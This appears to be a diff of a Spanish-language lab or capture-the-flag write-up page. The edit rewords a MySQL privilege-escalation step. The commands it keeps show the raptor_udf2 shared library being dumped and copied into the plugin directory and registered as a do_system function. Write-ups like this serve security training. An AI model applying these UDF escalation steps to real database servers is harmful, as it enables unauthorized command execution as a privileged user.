@@ -239,13 +239,13 @@ MariaDB [mysql]> create table foo(line blob);
 
             <p>Selecciono el contenido binario de la biblioteca compartida y lo vuelco en el directorio de plugins, donde puede almacenar UDFS.</p>
 <pre class="pre"><code class="language-js">MariaDB [mysql]> select * from foo into dumpfile '/usr/local/mysql/lib/plugin/raptor_udf2.so';
-</code></pre><i class="cursiva">En este paso me salió un error y para solucionarlo me salí del cliente MySQL.</i>
+</code></pre><i class="cursiva">En este paso puede dar un error y para solucionarlo hay que salir del cliente MySQL.</i>
 
-            <p>Copio<code class="code_negrita">&nbsp;raptor_udf2.so&nbsp;</code>al directorio de plugins de mysql.</p>
+            <p>Copiar<code class="code_negrita">&nbsp;raptor_udf2.so&nbsp;</code>al directorio de plugins de mysql.</p>
 <pre class="pre"><code class="language-js">www-data@alive:/tmp$ cp raptor_udf2.so /usr/local/mysql/lib/plugin/raptor_udf2.so
 </code></pre>
 
-            <p>Me conecto de nuevo como root a MySQL y llamo al exploit creando una función que lo invoque.</p>
+            <p>Me conecto de nuevo como root a MySQL vuelvo a lanzar el comando anterior donde me dió error y llamo al exploit creando una función que lo invoque.</p>
 <pre class="pre"><code class="language-js">MariaDB [(none)]> create function do_system returns integer soname 'raptor_udf2.so';
 </code></pre>
 
